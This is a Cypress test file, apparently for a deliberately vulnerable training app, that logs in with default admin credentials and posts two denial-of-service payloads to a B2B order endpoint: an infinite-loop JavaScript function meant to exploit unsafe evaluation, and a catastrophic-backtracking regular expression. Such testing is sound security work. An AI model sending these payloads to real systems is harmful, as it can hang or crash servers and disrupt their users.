describe('/b2b/v2/order', () => {
  const performRequest = async (orderLinesData) => {
    const response = await fetch(
      `${Cypress.config('baseUrl')}/b2b/v2/orders/`,
      {
        method: 'POST',
        cache: 'no-cache',
        headers: {
          'Content-type': 'application/json',
          Authorization: `Bearer ${localStorage.getItem('token')}`
        },
        body: JSON.stringify({ orderLinesData })
      }
    );
    return response;
  };

  const handleChallenge = async (challenge, orderLinesData, expectedStatus) => {
    const isDocker = await cy.task('isDocker');
    if (!isDocker) {
      await cy.login({ email: 'admin', password: 'admin123' });
      const response = await performRequest(orderLinesData);
      if (response.status === expectedStatus) {
        console.log('Success');
      }
      cy.expectChallengeSolved({ challenge });
    }
  };

  describe('challenge "rce"', () => {
    it('an infinite loop deserialization payload should not bring down the server', async () => {
      await handleChallenge('Blocked RCE DoS', '(function dos() { while(true); })()', 500);
    });
  });

  describe('challenge "rceOccupy"', () => {
    it('should be possible to cause request timeout using a recursive regular expression payload', async () => {
      await handleChallenge('Successful RCE DoS', "/((a+)+)b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaa')", 503);
    });
  });
});